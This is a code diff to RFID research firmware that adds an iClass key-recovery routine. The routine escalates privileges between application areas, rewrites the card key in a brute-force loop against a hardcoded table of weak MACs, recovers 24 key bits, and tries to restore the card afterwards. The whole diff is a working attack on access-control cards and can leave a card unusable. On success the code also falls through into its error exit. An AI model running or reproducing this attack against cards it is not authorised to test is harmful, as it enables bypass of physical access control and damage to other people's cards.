@@ -2152,3 +2152,201 @@ out:
         reply_ng(CMD_HF_ICLASS_RESTORE, isOK, NULL, 0);
     }
 }
+
+void generate_single_key_block_inverted(const uint8_t *startingKey, uint32_t index, uint8_t *keyBlock) {
+    uint32_t carry = index;
+    memcpy(keyBlock, startingKey, PICOPASS_BLOCK_SIZE);
+
+    for (int j = PICOPASS_BLOCK_SIZE - 1; j >= 0; j--) {
+        uint8_t increment_value = carry & 0x07;  // Use only the last 3 bits of carry
+        keyBlock[j] = increment_value;  // Set the last 3 bits, assuming first 5 bits are always 0
+
+        carry >>= 3;  // Shift right by 3 bits for the next byte
+        if (carry == 0) {
+            // If no more carry, break early to avoid unnecessary loops
+            break;
+        }
+    }
+}
+
+void iClass_Recover(iclass_recover_req_t *msg) {
+
+    bool shallow_mod = false;
+
+    LED_A_ON();
+    Dbprintf(_RED_("Interrupting this process will render the card unusable!"));
+
+    Iso15693InitReader();
+    //Authenticate with AA2 with the standard key to get the AA2 mac
+    //Step0 Card Select Routine
+
+    uint32_t eof_time = 0;
+    picopass_hdr_t hdr = {0};
+    bool res = select_iclass_tag(&hdr, true, &eof_time, shallow_mod);
+    if (res == false) {
+        goto out;
+    }
+
+    //Step1 Authenticate with AA2 using K2
+
+    uint8_t mac2[4] = {0};
+    uint32_t start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
+    res = authenticate_iclass_tag(&msg->req2, &hdr, &start_time, &eof_time, mac2);
+    if (res == false) {
+        goto out;
+    }
+
+    uint8_t div_key2[8] = {0};
+    memcpy(div_key2, hdr.key_c, 8);
+
+    //cycle reader to reset cypher state and be able to authenticate with k1 trace
+    switch_off();
+    Iso15693InitReader();
+
+    //Step0 Card Select Routine
+
+    eof_time = 0;
+    //hdr = {0};
+    res = select_iclass_tag(&hdr, false, &eof_time, shallow_mod);
+    if (res == false) {
+        goto out;
+    }
+
+    //Step1 Authenticate with AA1 using trace
+
+    uint8_t mac1[4] = {0};
+    start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
+    res = authenticate_iclass_tag(&msg->req, &hdr, &start_time, &eof_time, mac1);
+    if (res == false) {
+        goto out;
+    }
+
+    //Step2 Privilege Escalation: attempt to read AA2 with credentials for AA1
+    uint8_t blockno = 24;
+    uint8_t cmd_read[] = {ICLASS_CMD_READ_OR_IDENTIFY, blockno, 0x00, 0x00};
+    AddCrc(cmd_read + 1, 1);
+    uint8_t resp[10];
+
+    res = iclass_send_cmd_with_retries(cmd_read, sizeof(cmd_read), resp, sizeof(resp), 10, 3, &start_time, ICLASS_READER_TIMEOUT_OTHERS, &eof_time, shallow_mod);
+
+    static uint8_t iclass_mac_table[8][8] = {    //Reference weak macs table
+        { 0x00, 0x00, 0x00, 0x00, 0xBF, 0x5D, 0x67, 0x7F }, //Expected mac when last 3 bits of each byte are: 000
+        { 0x00, 0x00, 0x00, 0x00, 0x10, 0xED, 0x6F, 0x11 }, //Expected mac when last 3 bits of each byte are: 001
+        { 0x00, 0x00, 0x00, 0x00, 0x53, 0x35, 0x42, 0x0F }, //Expected mac when last 3 bits of each byte are: 010
+        { 0x00, 0x00, 0x00, 0x00, 0xAB, 0x47, 0x4D, 0xA0 }, //Expected mac when last 3 bits of each byte are: 011
+        { 0x00, 0x00, 0x00, 0x00, 0xF6, 0xCF, 0x43, 0x36 }, //Expected mac when last 3 bits of each byte are: 100
+        { 0x00, 0x00, 0x00, 0x00, 0x59, 0x7F, 0x4B, 0x58 }, //Expected mac when last 3 bits of each byte are: 101
+        { 0x00, 0x00, 0x00, 0x00, 0x1A, 0xA7, 0x66, 0x46 }, //Expected mac when last 3 bits of each byte are: 110
+        { 0x00, 0x00, 0x00, 0x00, 0xE2, 0xD5, 0x69, 0xE9 }  //Expected mac when last 3 bits of each byte are: 111
+    };
+    //Viewing the weak macs table card 24 bits (3x8) in the form of a 24 bit decimal number
+    static uint32_t iclass_mac_table_bit_values[8] = {0, 2396745, 4793490, 7190235, 9586980, 11983725, 14380470, 16777215};
+
+    /*  iclass_mac_table is a series of weak macs, those weak macs correspond to the different combinations of the last 3 bits of each key byte.
+    If we concatenate the last three bits of each key byte, we have a 24 bits long binary string.
+    If we convert that string to decimal we obtain the decimal numbers in iclass_mac_table_bit_values
+    Xorring the index of iterations against those decimal numbers allows us to retrieve the what was the corresponding sequence of bits of the original key in decimal format. */
+
+    uint8_t zero_key[PICOPASS_BLOCK_SIZE] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
+    uint32_t index = 1;
+    int bits_found = -1;
+
+    //START LOOP
+    while (bits_found == -1) {
+
+        //Step3 Calculate New Key
+        uint8_t genkeyblock[PICOPASS_BLOCK_SIZE];
+        uint8_t genkeyblock_old[PICOPASS_BLOCK_SIZE];
+        uint8_t xorkeyblock[PICOPASS_BLOCK_SIZE];
+        generate_single_key_block_inverted(zero_key, index, genkeyblock);
+
+        //NOTE BEFORE UPDATING THE KEY WE NEED TO KEEP IN MIND KEYS ARE XORRED
+        //xor the new key against the previously generated key so that we only update the difference
+        if (index != 0) {
+            generate_single_key_block_inverted(zero_key, index - 1, genkeyblock_old);
+            for (int i = 0; i < 8 ; i++) {
+                xorkeyblock[i] = genkeyblock[i] ^ genkeyblock_old[i];
+            }
+        } else {
+            memcpy(xorkeyblock, genkeyblock, PICOPASS_BLOCK_SIZE);
+        }
+
+        //Step4 Calculate New Mac
+
+        bool use_mac = true;
+        uint8_t wb[9] = {0};
+        blockno = 3;
+        wb[0] = blockno;
+        memcpy(wb + 1, xorkeyblock, 8);
+        doMAC_N(wb, sizeof(wb), div_key2, mac2);
+
+        //Step5 Perform Write
+
+        DbpString("Generated XOR Key: ");
+        Dbhexdump(8, xorkeyblock, false);
+
+        if (iclass_writeblock_ext(blockno, xorkeyblock, mac2, use_mac, shallow_mod)) {
+            Dbprintf("Write block [%3d/0x%02X] " _GREEN_("successful"), blockno, blockno);
+        } else {
+            Dbprintf("Write block [%3d/0x%02X] " _RED_("failed"), blockno, blockno);
+            if (index > 1) {
+                Dbprintf(_RED_("Card is likely to be unusable!"));
+            }
+            goto out;
+        }
+        //Step6 Perform 8 authentication attempts
+
+        for (int i = 0; i < 8 ; ++i) {
+            //need to craft the authentication payload accordingly
+            memcpy(msg->req.key, iclass_mac_table[i], 8);
+            res = authenticate_iclass_tag(&msg->req, &hdr, &start_time, &eof_time, mac1); //mac1 here shouldn't matter
+            if (res == true) {
+                bits_found = iclass_mac_table_bit_values[i] ^ index;
+                Dbprintf("Found Card Bits Index: " _GREEN_("[%3d]"), index);
+                Dbprintf("Mac Table Bit Values: " _GREEN_("[%3d]"), iclass_mac_table_bit_values[i]);
+                Dbprintf("Decimal Value of Partial Key: " _GREEN_("[%3d]"), bits_found);
+                goto restore;
+            }
+        }
+        index++;
+    }//end while
+
+
+restore:
+    ;//empty statement for compilation
+    uint8_t partialkey[PICOPASS_BLOCK_SIZE];
+    convertToHexArray(bits_found, partialkey);
+
+    uint8_t resetkey[PICOPASS_BLOCK_SIZE];
+    convertToHexArray(index, resetkey);
+
+    //Calculate reset Mac
+
+    bool use_mac = true;
+    uint8_t wb[9] = {0};
+    blockno = 3;
+    wb[0] = blockno;
+    memcpy(wb + 1, resetkey, 8);
+    doMAC_N(wb, sizeof(wb), div_key2, mac2);
+
+    //Write back the card to the original key
+    DbpString(_YELLOW_("Restoring Card to the original key using Reset Key: "));
+    Dbhexdump(8, resetkey, false);
+    if (iclass_writeblock_ext(blockno, resetkey, mac2, use_mac, shallow_mod)) {
+        Dbprintf("Restore of Original Key "_GREEN_("successful. Card is usable again."));
+    } else {
+        Dbprintf("Restore of Original Key " _RED_("failed. Card is likely unusable."));
+    }
+    //Print the 24 bits found from k1
+    DbpString(_YELLOW_("Raw Key Partial Bytes: "));
+    Dbhexdump(8, partialkey, false);
+    switch_off();
+    reply_ng(CMD_HF_ICLASS_RECOVER, PM3_SUCCESS, NULL, 0);
+
+
+out:
+
+    switch_off();
+    reply_ng(CMD_HF_ICLASS_RECOVER, PM3_ESOFT, NULL, 0);
+
+}
